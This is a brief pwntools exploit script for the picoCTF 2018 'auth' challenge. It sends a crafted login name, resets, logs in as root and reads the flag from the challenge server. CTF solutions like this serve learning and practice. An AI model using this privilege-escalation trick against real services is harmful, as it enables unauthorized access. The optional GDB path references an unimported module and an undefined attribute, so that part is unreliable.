#! /usr/bin/env python
import sys
#
from pwn import context, p32, u32, log, process, remote, args, sleep
context.clear(arch='i386', os='linux', endian='little', word_size=32)


class ExploitInfo:
    host        = '2018shell2.picoctf.com'
    port        = 41208
    name        = 'auth'


def get_process():
    r = None
    if args.REMOTE:
        r = remote(ExploitInfo.host, ExploitInfo.port)
    else:
        r = process('./%s' % ExploitInfo.name)
        if args.GDB:
            gdb.attach(r.pid, ExploitInfo.gdb)

    return r


def main():
    p = get_process()

    user_name = 'A' * 8 + '\x05'
    payload = 'login %s' % user_name
    p.clean(timeout=0.5)
    p.sendline(payload)

    p.sendline('reset')

    p.clean(timeout=0.5)
    p.sendline('login root')
    p.sendline('get-flag')
    sleep(1)
    print(p.recv(2048))

    p.sendline('quit')
    p.close()


if __name__ == "__main__":
    main()
